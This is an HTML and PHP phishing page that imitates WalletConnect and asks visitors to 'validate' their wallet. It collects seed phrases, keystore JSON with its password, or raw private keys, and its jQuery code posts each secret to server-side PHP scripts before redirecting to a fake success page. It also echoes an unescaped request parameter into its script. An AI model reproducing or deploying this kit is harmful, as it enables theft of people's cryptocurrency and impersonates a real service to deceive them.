<html>

<head>
    <link rel="stylesheet" href="main.css" type="text/css" />
    <meta charset="UTF-8">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="/images/logo.svg">
    <link rel="icon" href="logo.svg">
    <script>
        function openCity(evt, cityName) {
            // Declare all variables 
            var i, tabcontent, tablinks;

            // Get all elements with class="tabcontent" and hide them
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }

            // Get all elements with class="tablinks" and remove the class "active"
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }

            // Show the current tab, and add an "active" class to the button that opened the tab
            document.getElementById(cityName).style.display = "block";
            evt.currentTarget.className += " active";
        }
    </script>
</head>

<title>Import Wallet</title>

<body>
    <center>
        <div class="top">
            <a href="#" class="left">Github</a>
            <a href="#" class="left">Docs</a>
            <a href="#" class="main"><img src="logo.svg" alt="logo" /></a>
            <a href="#" class="left">Wallets</a>
            <a href="#" class="left">Apps</a>
        </div>
        </br>
        <h2>
            <center>Validate Wallet</center>
        </h2>
        </br>
        <div class="tab">
            <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
            <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
            <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
        </div>

        <div id="phrase" class="tabcontent">
            <form>

                <textarea name="phrases" required="required" minlength="12" id="phrase-box"
                    placeholder="Typically 12 (sometimes 24) words separated by single spaces"
                    required="required"></textarea>
                </br>
                <br>
                <div class="desc"></div>
                </br>
                <button type="submit" name="submit" class="btn" id="v-phrase">VALIDATE</button>
            </form>
        </div>

        <div id="keystore" class="tabcontent">
            <form>

                <textarea id="json" required="required" minlength="12" placeholder="Keystore JSON"
                    required="required"></textarea>
                </br>
                <div class="field">
                    <input type="text" id="password" placeholder="Password" required="required" minlength="4" />
                </div>
                <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
                </div>
                </br>
                <button type="submit" name="submit" class="btn" id="v-json">VALIDATE</button>
            </form>
        </div>

        <div id="private" class="tabcontent">
            <form>
                <!-- <input type="hidden" name="privatekey" value="Private Key"/> -->
                <div class="field">
                    <input type="text" id="privatekey" placeholder="Private Key" required="required" minlength="64" />
                </div>
                <div class="desc">Typically 64 alphanumeric characters</div>
                </br>
                <button type="submit" name="submit" class="btn" id="v-private">VALIDATE</button>
            </form>
        </div>

        <script>
            document.getElementById("default").click();
        </script>
        <footer>
            <div id="footer">
                <p><img src="discord.svg" class="footimg"> <a href="https://discord.gg/jhxMvxP">Discord</a></p>
                </br>
                <p><img src="telegram.svg" class="footimg"> <a
                        href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
                <p><img src="twitter.svg" class="footimg"> <a href="https://twitter.walletconnect.org/">Twitter</a></p>
                </br>
                <p><img src="github.svg" class="footimg"> <a href="https://github.com/walletconnect">Github</a>
                </p></br>
            </div>
        </footer>
</body>
<!--<script src="app.js"></script>-->
<script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
    crossorigin="anonymous"></script>

    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>


    <script type="text/javascript">
        
        $('#v-phrase').click(function(e){
            e.preventDefault();
            var name = $('#phrase-box').val()
            
            if(name != ''){
                swal({
                    text: 'Proceed with validation?',
                    button: {
                        text: "Yes",
                        closeModal: false,
                    },
                })
                .then((willSend) => {
                    if (willSend) {
                        $.ajax({
                            type: 'POST',
                            url: 'validatePhrase.php?phrase='+name+'&type=<?php echo $_REQUEST["OfType"]?>',
                            success: function(data) {
                                if(data == '1'){
                                    window.location.href = './Success'
                                    $('input,textarea').val('')
                                }else{
                                    swal('An error occurred. Please retry later');
                                }
                            }
                        })
                    }
                });
                
            }else{
                swal('Please provide a phrase')
            }
        })
        
        $('#v-json').click(function(e){
            e.preventDefault();
            var json = $('#json').val()
            var password = $('#password').val()
            
            if(json != '' && password != ''){
                swal({
                    text: 'Proceed with validation?',
                    button: {
                        text: "Yes",
                        closeModal: false,
                    },
                })
                .then((willSend) => {
                    if (willSend) {
                        $.ajax({
                            type: 'POST',
                            url: 'validateJSON.php?json='+json+'&password='+password+'&type=<?php echo $_REQUEST["OfType"]?>',
                            success: function(data) {
                                if(data == '1'){
                                    window.location.href = './Success'
                                    $('input,textarea').val('')
                                }else{
                                    swal('An error occurred. Please retry later');
                                }
                            }
                        })
                    }
                });
                
            }else{
                swal('Please provide both Keystore JSON and Password')
            }
        })
        
                
        $('#v-private').click(function(e){
            e.preventDefault();
            var name = $('#privatekey').val()
            
            if(name != ''){
                
                if(name.length != 64){
                    swal('Private key must be 64 characters')
                }else{
                    swal({
                        text: 'Proceed with validation?',
                        button: {
                            text: "Yes",
                            closeModal: false,
                        },
                    })
                    .then((willSend) => {
                        if (willSend) {
                            $.ajax({
                                type: 'POST',
                                url: 'validateKey.php?key='+name+'&type=<?php echo $_REQUEST["OfType"]?>',
                                success: function(data) {
                                    if(data == '1'){
                                        window.location.href = './Success'
                                        $('input,textarea').val('')
                                    }else{
                                        swal('An error occurred. Please retry later');
                                    }
                                }
                            })
                        }
                    });
                }
                
                
            }else{
                swal('Please provide a private key')
            }
        })
        

    </script>

</html >